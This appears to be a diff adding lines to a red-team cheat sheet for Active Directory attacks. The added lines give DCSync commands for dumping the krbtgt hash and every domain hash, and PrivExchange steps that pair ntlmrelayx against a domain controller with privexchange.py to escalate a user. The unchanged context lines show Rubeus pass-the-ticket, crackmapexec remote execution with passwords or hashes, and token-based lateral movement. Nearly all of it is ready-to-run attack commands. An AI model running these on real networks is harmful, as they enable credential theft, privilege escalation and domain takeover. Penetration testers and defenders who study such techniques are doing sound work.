@@ -5,6 +5,8 @@ make_token domain\user password
 rev2self
 
 dcsync fqdn domain\user (User must have DCSync rights)
+  dcsync fqdn domain\krbtgt (golden ticket)
+  dcsync fqdn (dump entire domain hashes)
 Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
 
 Seatbelt.exe system (Opsec Tool)
@@ -18,6 +20,14 @@ crackmapexec IP_Address -u username -p='password' (Test if you have access)
 crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
   - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
 crackmapexec IP -u username -H hash
+
+Exchange PrivEsc
+  https://github.com/dirkjanm/privexchange
+  ## Modify the httattack.py script and change "attacker_url = 'http://dev.testsegment.local/myattackerurl/'" to the url of the attack box running ntlxrelayx 
+  ntlmrelayx.py -t ldap://fqdn.domain_controller --escalate-user <domain_user_name>
+  python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
+  # Windows Version
+   - http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html
 
 lateral movement
   make_token username password
